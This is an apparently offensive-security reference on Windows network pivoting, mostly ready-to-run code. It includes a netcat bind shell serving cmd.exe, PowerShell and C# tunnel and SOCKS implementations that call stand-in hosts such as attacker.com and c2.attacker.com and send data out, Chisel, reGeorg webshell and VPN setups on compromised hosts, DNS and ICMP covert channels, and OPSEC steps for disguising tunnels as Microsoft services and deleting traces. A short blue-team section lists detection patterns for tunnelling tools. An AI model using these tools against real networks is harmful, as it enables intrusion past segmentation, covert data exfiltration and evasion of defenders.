# Windows Pivoting Techniques Reference

## ELI5: Building Secret Underground Tunnels

### The Tunnel Network Analogy

Imagine you're building a secret tunnel system under a city:

**Normal Route:**
```
Your House → Street → Target Building
(Your Computer → Internet → Target Server)
```

**Pivoting Route:**
```
Your House → Secret Tunnel → Compromised Building → Underground Passage → Target
(Your Computer → Tunnel → Compromised Host → Internal Network → Target)
```

### Types of Tunnels

**Local Port Forward** = One-way tunnel FROM you
```
You → Tunnel → Target
"Bring that door to me"
```

**Remote Port Forward** = One-way tunnel TO you
```
Target → Tunnel → You
"Send their stuff back to me"
```

**Dynamic Port Forward** = Magic tunnel that goes anywhere
```
You → Tunnel → Anywhere in their network
"Universal keyhole to their world"
```

**Double Pivot** = Tunnel through multiple buildings
```
You → Tunnel1 → Host1 → Tunnel2 → Host2 → Target
"Tunnel inception"
```

### Why Pivoting Is Essential

```
External Attacker: "I can only see the front door"
Pivoting: "Now I can see every room in every building"

Firewall: "Only port 443 allowed in"
Pivoting: "Cool, I'll send everything through 443"

Network Segmentation: "DMZ can't talk to internal"
Pivoting: "My tunnel says otherwise"
```

## Port Forwarding Fundamentals

### Local Port Forwarding

```powershell
# SSH Local Forward (Windows 10+ has SSH!)
ssh -L 3389:internal-server:3389 user@jump-host
# Now: mstsc /v:localhost connects to internal-server

# PowerShell Port Forwarding
function New-PortForward {
    param(
        [int]$LocalPort,
        [string]$RemoteHost,
        [int]$RemotePort
    )

    $listener = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any, $LocalPort)
    $listener.Start()

    while($true) {
        $client = $listener.AcceptTcpClient()
        $stream = $client.GetStream()

        $remoteClient = [System.Net.Sockets.TcpClient]::new($RemoteHost, $RemotePort)
        $remoteStream = $remoteClient.GetStream()

        # Bidirectional stream copy
        $job1 = Start-Job {
            param($from, $to)
            $buffer = New-Object byte[] 1024
            while(($read = $from.Read($buffer, 0, $buffer.Length)) -gt 0) {
                $to.Write($buffer, 0, $read)
            }
        } -ArgumentList $stream, $remoteStream

        $job2 = Start-Job {
            param($from, $to)
            $buffer = New-Object byte[] 1024
            while(($read = $from.Read($buffer, 0, $buffer.Length)) -gt 0) {
                $to.Write($buffer, 0, $read)
            }
        } -ArgumentList $remoteStream, $stream
    }
}

# Usage
New-PortForward -LocalPort 8080 -RemoteHost internal.server -RemotePort 80
```

### Remote Port Forwarding

```powershell
# SSH Remote Forward
ssh -R 8080:localhost:80 user@external-server
# external-server:8080 now forwards to our local port 80

# NetCat reverse forward
# On compromised host:
nc -l -p 4444 -e cmd.exe

# PowerShell reverse port forward
$reverseForward = @'
$client = New-Object System.Net.Sockets.TcpClient("attacker.com", 4444)
$stream = $client.GetStream()

$localListener = New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Any, 3389)
$localListener.Start()

while($true) {
    $localClient = $localListener.AcceptTcpClient()
    $localStream = $localClient.GetStream()

    # Bridge streams
    Start-Job {
        param($s1, $s2)
        $buffer = New-Object byte[] 4096
        while($true) {
            $read = $s1.Read($buffer, 0, $buffer.Length)
            if($read -le 0) { break }
            $s2.Write($buffer, 0, $read)
        }
    } -ArgumentList $localStream, $stream
}
'@

Invoke-Expression $reverseForward
```

### Dynamic Port Forwarding

```powershell
# SSH Dynamic SOCKS proxy
ssh -D 1080 user@pivot-host
# Configure browser/tools to use localhost:1080 as SOCKS proxy

# PowerShell SOCKS implementation
class SocksProxy {
    [int]$Port
    [System.Net.Sockets.TcpListener]$Listener

    SocksProxy([int]$port) {
        $this.Port = $port
        $this.Listener = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any, $port)
    }

    [void]Start() {
        $this.Listener.Start()
        Write-Host "SOCKS proxy started on port $($this.Port)"

        while($true) {
            $client = $this.Listener.AcceptTcpClient()
            $this.HandleClient($client)
        }
    }

    [void]HandleClient([System.Net.Sockets.TcpClient]$client) {
        $stream = $client.GetStream()
        $reader = [System.IO.BinaryReader]::new($stream)
        $writer = [System.IO.BinaryWriter]::new($stream)

        # SOCKS handshake
        $version = $reader.ReadByte()
        if($version -ne 5) { return }

        $authMethodCount = $reader.ReadByte()
        $authMethods = $reader.ReadBytes($authMethodCount)

        # No auth required
        $writer.Write([byte]5)
        $writer.Write([byte]0)

        # Connection request
        $version = $reader.ReadByte()
        $command = $reader.ReadByte()
        $reserved = $reader.ReadByte()
        $addressType = $reader.ReadByte()

        $targetHost = ""
        $targetPort = 0

        switch($addressType) {
            1 { # IPv4
                $ip = $reader.ReadBytes(4)
                $targetHost = [System.Net.IPAddress]::new($ip).ToString()
            }
            3 { # Domain
                $length = $reader.ReadByte()
                $domain = [System.Text.Encoding]::ASCII.GetString($reader.ReadBytes($length))
                $targetHost = $domain
            }
        }

        $portBytes = $reader.ReadBytes(2)
        $targetPort = [System.BitConverter]::ToUInt16($portBytes, 0)

        # Connect to target
        $targetClient = [System.Net.Sockets.TcpClient]::new()
        $targetClient.Connect($targetHost, $targetPort)

        # Send success response
        $writer.Write([byte]5)
        $writer.Write([byte]0)
        $writer.Write([byte]0)
        $writer.Write([byte]1)
        $writer.Write([byte[]]@(0,0,0,0))
        $writer.Write([byte[]]@(0,0))

        # Relay traffic
        $this.RelayTraffic($client, $targetClient)
    }

    [void]RelayTraffic($client1, $client2) {
        # Bidirectional relay implementation
    }
}

# Start SOCKS proxy
$proxy = [SocksProxy]::new(1080)
$proxy.Start()
```

### Netsh Port Forwarding

```powershell
# Windows built-in port forwarding
# Add port forward
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8080 connectaddress=10.10.10.10 connectport=80

# List forwards
netsh interface portproxy show all

# Delete forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=8080

# IPv6 to IPv4 forward
netsh interface portproxy add v6tov4 listenaddress=:: listenport=8080 connectaddress=10.10.10.10 connectport=80

# Port forward with specific interface
netsh interface portproxy add v4tov4 listenaddress=192.168.1.100 listenport=445 connectaddress=10.10.10.10 connectport=445
```

## SOCKS Proxy Implementation

### Chisel Setup and Usage

```bash
# Chisel - Fast TCP/UDP tunnel over HTTP
# Download: https://github.com/jpillora/chisel

# Server (on your attack box)
./chisel server -p 8080 --reverse

# Client (on compromised Windows host)
.\chisel.exe client attacker.com:8080 R:socks

# Now you have SOCKS5 on 127.0.0.1:1080

# Multiple tunnels
.\chisel.exe client attacker.com:8080 R:3389:internal-server:3389 R:socks

# With authentication
./chisel server -p 8080 --auth user:pass --reverse
.\chisel.exe client --auth user:pass attacker.com:8080 R:socks
```

### Metasploit SOCKS Module

```ruby
# In Meterpreter session
use auxiliary/server/socks_proxy
set VERSION 4a
set SRVPORT 1080
run

# Or with SOCKS5
use auxiliary/server/socks5
set SRVPORT 1080
run

# Route through session
route add 10.10.10.0 255.255.255.0 1  # Session 1

# Use with ProxyChains
echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf
proxychains nmap -sT -Pn 10.10.10.0/24
```

### ProxyChains Configuration

```bash
# /etc/proxychains.conf
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
# Single SOCKS proxy
socks5 127.0.0.1 1080

# Chain multiple proxies
socks5 127.0.0.1 1080
socks4 192.168.1.100 1081
http 10.10.10.10 8080

# Dynamic chain (skip dead proxies)
dynamic_chain
socks5 127.0.0.1 1080
socks5 127.0.0.1 1081
socks5 127.0.0.1 1082

# Random chain
random_chain
chain_len = 2
socks5 127.0.0.1 1080
socks5 127.0.0.1 1081
socks5 127.0.0.1 1082
```

### ReGeorg/Neo-reGeorg

```python
# reGeorg - SOCKS proxy via webshell
# Upload tunnel.aspx to compromised IIS server

# Start SOCKS proxy
python reGeorgSocksProxy.py -p 1080 -u http://compromised.com/tunnel.aspx

# Neo-reGeorg (improved version)
# Generate custom tunnel
python neoreg.py generate -k password

# Upload generated tunnel.aspx

# Start proxy with encryption
python neoreg.py -k password -u http://compromised.com/tunnel.aspx -p 1080

# Use with tools
proxychains nmap -sT internal-network
proxychains mssqlclient.py sa@internal-sql
```

### Custom SOCKS Implementation

```csharp
using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;

public class CustomSOCKS
{
    private TcpListener listener;
    private Thread listenThread;

    public void Start(int port)
    {
        listener = new TcpListener(IPAddress.Any, port);
        listener.Start();

        listenThread = new Thread(ListenForClients);
        listenThread.Start();
    }

    private void ListenForClients()
    {
        while (true)
        {
            TcpClient client = listener.AcceptTcpClient();
            Thread clientThread = new Thread(HandleClient);
            clientThread.Start(client);
        }
    }

    private void HandleClient(object clientObj)
    {
        TcpClient client = (TcpClient)clientObj;
        NetworkStream stream = client.GetStream();

        // SOCKS5 handshake
        byte[] buffer = new byte[1024];
        int bytes = stream.Read(buffer, 0, buffer.Length);

        if (buffer[0] != 0x05) return; // Not SOCKS5

        // Send no auth required
        stream.Write(new byte[] { 0x05, 0x00 }, 0, 2);

        // Read connect request
        bytes = stream.Read(buffer, 0, buffer.Length);

        if (buffer[1] != 0x01) return; // Not CONNECT command

        // Parse destination
        string destHost = "";
        int destPort = 0;

        int addrType = buffer[3];
        if (addrType == 0x01) // IPv4
        {
            destHost = $"{buffer[4]}.{buffer[5]}.{buffer[6]}.{buffer[7]}";
            destPort = (buffer[8] << 8) | buffer[9];
        }
        else if (addrType == 0x03) // Domain
        {
            int domainLen = buffer[4];
            destHost = System.Text.Encoding.ASCII.GetString(buffer, 5, domainLen);
            destPort = (buffer[5 + domainLen] << 8) | buffer[6 + domainLen];
        }

        // Connect to destination
        TcpClient destClient = new TcpClient();
        try
        {
            destClient.Connect(destHost, destPort);

            // Send success
            byte[] response = new byte[] {
                0x05, 0x00, 0x00, 0x01,
                0x00, 0x00, 0x00, 0x00,
                0x00, 0x00
            };
            stream.Write(response, 0, response.Length);

            // Relay traffic
            RelayTraffic(client, destClient);
        }
        catch
        {
            // Send failure
            byte[] response = new byte[] {
                0x05, 0x01, 0x00, 0x01,
                0x00, 0x00, 0x00, 0x00,
                0x00, 0x00
            };
            stream.Write(response, 0, response.Length);
        }
    }

    private void RelayTraffic(TcpClient client1, TcpClient client2)
    {
        NetworkStream stream1 = client1.GetStream();
        NetworkStream stream2 = client2.GetStream();

        Thread t1 = new Thread(() => CopyStream(stream1, stream2));
        Thread t2 = new Thread(() => CopyStream(stream2, stream1));

        t1.Start();
        t2.Start();

        t1.Join();
        t2.Join();

        client1.Close();
        client2.Close();
    }

    private void CopyStream(NetworkStream from, NetworkStream to)
    {
        byte[] buffer = new byte[4096];
        int bytes;

        try
        {
            while ((bytes = from.Read(buffer, 0, buffer.Length)) > 0)
            {
                to.Write(buffer, 0, bytes);
            }
        }
        catch { }
    }
}
```

## Reverse Tunnel Techniques

### Reverse SSH Tunnels

```bash
# Reverse SSH from Windows (OpenSSH)
# From compromised host TO attacker
ssh -R 8080:internal-server:80 attacker@external-server

# Multiple reverse tunnels
ssh -R 3389:internal-rdp:3389 -R 445:internal-smb:445 attacker@external

# Reverse dynamic SOCKS
ssh -R 1080 attacker@external
# On attacker: ssh -D 1080 localhost

# Persistent reverse SSH
while true; do
    ssh -R 8080:localhost:80 -N attacker@external
    sleep 10
done

# AutoSSH for persistence
autossh -M 0 -R 8080:internal:80 attacker@external
```

### Reverse HTTP/HTTPS Tunnels

```powershell
# PowerShell reverse HTTP tunnel
$reverseHTTP = @'
while($true) {
    try {
        $client = New-Object System.Net.WebClient
        $client.Headers.Add("User-Agent", "Mozilla/5.0")

        # Check for commands
        $command = $client.DownloadString("https://c2.attacker.com/get")

        if($command -ne "none") {
            # Parse tunnel request
            # Format: CONNECT:targethost:port
            if($command -match "CONNECT:([^:]+):(\d+)") {
                $targetHost = $matches[1]
                $targetPort = $matches[2]

                # Establish connection
                $tcp = New-Object System.Net.Sockets.TcpClient($targetHost, $targetPort)
                $stream = $tcp.GetStream()

                # Read data
                $buffer = New-Object byte[] 65536
                $read = $stream.Read($buffer, 0, $buffer.Length)

                # Send back via HTTP POST
                $data = [Convert]::ToBase64String($buffer[0..($read-1)])
                $client.UploadString("https://c2.attacker.com/data", $data)
            }
        }
    }
    catch { }

    Start-Sleep -Seconds 5
}
'@

Invoke-Expression $reverseHTTP
```

### DNS Tunneling for Pivoting

```powershell
# PowerShell DNS tunnel pivot
function Start-DNSTunnel {
    param($Domain, $DNSServer)

    while($true) {
        # Check for tunnel requests via DNS
        $query = "check.$(Get-Random -Maximum 999999).$Domain"

        try {
            $response = Resolve-DnsName -Name $query -Server $DNSServer -Type TXT
            $command = [System.Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($response.Strings))

            if($command -match "TUNNEL:([^:]+):(\d+)") {
                $host = $matches[1]
                $port = $matches[2]

                # Create local tunnel
                $listener = [System.Net.Sockets.TcpListener]::new(([System.Net.IPAddress]::Any), 0)
                $listener.Start()
                $localPort = $listener.LocalEndpoint.Port

                # Report back via DNS
                $status = "READY:$localPort"
                $encoded = [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($status))

                # Split into DNS labels
                $chunks = $encoded -split '(.{63})' | Where { $_ }
                foreach($chunk in $chunks) {
                    Resolve-DnsName -Name "$chunk.$Domain" -Server $DNSServer
                }
            }
        }
        catch { }

        Start-Sleep -Seconds 10
    }
}
```

### ICMP Tunneling

```csharp
// ICMP tunnel for when everything else is blocked
using System;
using System.Net;
using System.Net.NetworkInformation;

public class ICMPTunnel
{
    private string targetHost;
    private int dataPerPacket = 32; // Typical ping size

    public ICMPTunnel(string target)
    {
        this.targetHost = target;
    }

    public void SendData(byte[] data)
    {
        Ping ping = new Ping();

        // Fragment data into ICMP packets
        for(int i = 0; i < data.Length; i += dataPerPacket)
        {
            int size = Math.Min(dataPerPacket, data.Length - i);
            byte[] chunk = new byte[size];
            Array.Copy(data, i, chunk, 0, size);

            // Send as ICMP echo request
            PingReply reply = ping.Send(targetHost, 1000, chunk);
        }
    }

    public byte[] ReceiveData()
    {
        // Listen for ICMP responses
        // Extract data from ping replies
        // Reassemble fragments
        return null;
    }

    public void CreateTunnel(string internalHost, int internalPort)
    {
        TcpListener listener = new TcpListener(IPAddress.Any, 8080);
        listener.Start();

        while(true)
        {
            TcpClient client = listener.AcceptTcpClient();
            NetworkStream stream = client.GetStream();

            // Read from TCP
            byte[] buffer = new byte[4096];
            int bytes = stream.Read(buffer, 0, buffer.Length);

            // Send via ICMP
            SendData(buffer);

            // Receive response via ICMP
            byte[] response = ReceiveData();

            // Write back to TCP
            stream.Write(response, 0, response.Length);
        }
    }
}
```

### Named Pipe Pivoting

```powershell
# Named pipe for local pivoting
# Create pipe server
$pipeName = "pivot_pipe"
$pipe = New-Object System.IO.Pipes.NamedPipeServerStream($pipeName, [System.IO.Pipes.PipeDirection]::InOut)

Write-Host "Waiting for connection..."
$pipe.WaitForConnection()

# Create TCP forward through pipe
$tcpClient = New-Object System.Net.Sockets.TcpClient("internal-server", 445)
$tcpStream = $tcpClient.GetStream()

# Bridge pipe and TCP
$job1 = Start-Job {
    param($pipe, $tcp)
    $buffer = New-Object byte[] 4096
    while($true) {
        $read = $pipe.Read($buffer, 0, $buffer.Length)
        if($read -gt 0) {
            $tcp.Write($buffer, 0, $read)
        }
    }
} -ArgumentList $pipe, $tcpStream

# Access via pipe from another process
$pipeClient = New-Object System.IO.Pipes.NamedPipeClientStream(".", $pipeName, [System.IO.Pipes.PipeDirection]::InOut)
$pipeClient.Connect()
```

## Advanced Routing and Multi-Hop

### Windows Routing Table Manipulation

```powershell
# View routing table
route print
Get-NetRoute

# Add route for pivoting
route add 10.10.10.0 mask 255.255.255.0 192.168.1.50

# PowerShell route management
New-NetRoute -DestinationPrefix "10.10.10.0/24" -NextHop "192.168.1.50" -InterfaceIndex 12

# Persistent routes
route -p add 10.10.10.0 mask 255.255.255.0 192.168.1.50

# Delete routes
route delete 10.10.10.0
Remove-NetRoute -DestinationPrefix "10.10.10.0/24"

# Enable routing (turn Windows into router)
Set-NetIPInterface -Forwarding Enabled
reg add HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters /v IPEnableRouter /t REG_DWORD /d 1
```

### Multi-Interface Pivoting

```powershell
# Identify network interfaces
Get-NetAdapter
ipconfig /all

# Bind to specific interface for pivoting
$interface1 = "Ethernet"
$interface2 = "WiFi"

# Create listener on each interface
$listener1 = [System.Net.Sockets.TcpListener]::new(
    (Get-NetIPAddress -InterfaceAlias $interface1 -AddressFamily IPv4).IPAddress,
    8080
)

$listener2 = [System.Net.Sockets.TcpListener]::new(
    (Get-NetIPAddress -InterfaceAlias $interface2 -AddressFamily IPv4).IPAddress,
    8081
)

# Bridge traffic between interfaces
function Bridge-Interfaces {
    param($if1, $if2)

    # Route between network segments
    $client1 = $listener1.AcceptTcpClient()
    $client2 = New-Object System.Net.Sockets.TcpClient("internal-host", 80)

    # Copy streams between interfaces
}
```

### Double/Triple Pivoting

```bash
# Chain multiple pivots
# First pivot
ssh -D 1080 user@pivot1

# Second pivot through first
proxychains ssh -D 1081 user@pivot2

# Third pivot
proxychains ssh -D 1082 user@pivot3

# Configure ProxyChains for chain
cat >> /etc/proxychains.conf << EOF
strict_chain
[ProxyList]
socks4 127.0.0.1 1080
socks4 127.0.0.1 1081
socks4 127.0.0.1 1082
EOF

# Access deep internal network
proxychains nmap -sT internal-network
```

## VPN Over Compromised Host

```powershell
# OpenVPN on compromised Windows
# Download OpenVPN portable
Invoke-WebRequest -Uri "https://openvpn.net/downloads/openvpn-portable.exe" -OutFile "ovpn.exe"

# Generate config
$config = @"
client
dev tun
proto tcp
remote attacker.com 443
resolv-retry infinite
nobind
persist-key
persist-tun
ca ca.crt
cert client.crt
key client.key
cipher AES-256-CBC
comp-lzo
verb 3
"@

$config | Out-File -FilePath "client.ovpn"

# Start VPN
Start-Process -FilePath "ovpn.exe" -ArgumentList "--config client.ovpn"

# Now you have full VPN access through compromised host
```

## Detection and OPSEC

### Hiding Pivoting Activities

```powershell
# Use legitimate ports
$legitimatePorts = @(80, 443, 445, 3389, 5985, 8080)
$pivotPort = $legitimatePorts | Get-Random

# Mimic legitimate services
# Name your tunnels like real services
$serviceNames = @(
    "WindowsAzureGuestAgent",
    "MicrosoftEdgeUpdate",
    "OneDriveUpdater"
)

# Encrypt tunnel traffic
function Encrypt-Tunnel {
    param($data)
    $key = [System.Text.Encoding]::UTF8.GetBytes("ThisIs16ByteKey!")
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $key
    $aes.GenerateIV()

    $encryptor = $aes.CreateEncryptor()
    $encrypted = $encryptor.TransformFinalBlock($data, 0, $data.Length)

    return $aes.IV + $encrypted
}

# Clean up on exit
$cleanup = {
    netsh interface portproxy reset
    Get-Process | Where Name -match "tunnel|pivot|proxy" | Stop-Process
    Remove-Item C:\Windows\Temp\*.exe -Force -ErrorAction SilentlyContinue
}

Register-EngineEvent PowerShell.Exiting -Action $cleanup
```

### Blue Team Detection

```powershell
# Detect unusual network connections
Get-NetTCPConnection | Where {
    $_.State -eq "Established" -and
    $_.LocalPort -in @(1080, 8080, 9050) # Common proxy ports
}

# Monitor for netsh portproxy
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-WFP/Audit'; ID=5156} |
    Where { $_.Message -match "portproxy" }

# Detect SOCKS proxy patterns
$suspiciousConnections = Get-NetTCPConnection |
    Group-Object -Property OwningProcess |
    Where { $_.Count -gt 10 } # Many connections from single process

# Check for tunneling processes
Get-Process | Where {
    $_.Name -match "chisel|plink|proxychains|regeorg|ncat|socat"
}
```

## Tool-Specific Configurations

### Plink (PuTTY Link)

```powershell
# Download plink
Invoke-WebRequest -Uri "https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe" -OutFile "plink.exe"

# Create reverse tunnel
.\plink.exe -R 8080:internal-host:80 user@attacker-server

# Dynamic SOCKS
.\plink.exe -D 1080 user@pivot-host

# Background reverse tunnel
Start-Process -WindowStyle Hidden -FilePath "plink.exe" `
    -ArgumentList "-R 3389:localhost:3389 -N user@external"
```

### Socat

```bash
# TCP forward
socat TCP-LISTEN:8080,fork TCP:internal-host:80

# SOCKS proxy
socat TCP-LISTEN:1080,fork SOCKS4:proxy-host:internal-host:80

# SSL tunnel
socat OPENSSL-LISTEN:443,cert=cert.pem,fork TCP:internal:22

# UDP forward
socat UDP-LISTEN:53,fork UDP:internal-dns:53
```

## Quick Reference

```powershell
# Local forward
ssh -L 3389:target:3389 pivot@host

# Remote forward
ssh -R 8080:target:80 attacker@external

# Dynamic SOCKS
ssh -D 1080 user@pivot

# Netsh forward
netsh interface portproxy add v4tov4 listenport=8080 connectaddress=target connectport=80

# Chisel
.\chisel.exe client attacker:8080 R:socks

# ProxyChains
proxychains nmap -sT target
```

## Conclusion

Pivoting is the art of turning one foothold into complete network access. It's about building invisible highways through secured networks. Key principles:

1. **Always have multiple pivot methods** - When one fails, switch
2. **Blend with legitimate traffic** - Use common ports and protocols
3. **Chain pivots for depth** - One hop is rarely enough
4. **Maintain persistence** - Tunnels die, automation lives
5. **Clean up your tracks** - Remove pivoting artifacts

Remember: Every pivot extends your attack surface but also your detection surface. Choose wisely.

## Lab Exercises

1. **Single Pivot Challenge**: Pivot through one host to reach isolated network
2. **Double Pivot Challenge**: Chain two pivots to reach deep internal network
3. **Protocol Challenge**: Create tunnels using only DNS/ICMP
4. **Persistence Challenge**: Build auto-reconnecting tunnel infrastructure
5. **Detection Challenge**: Pivot without triggering common detection rules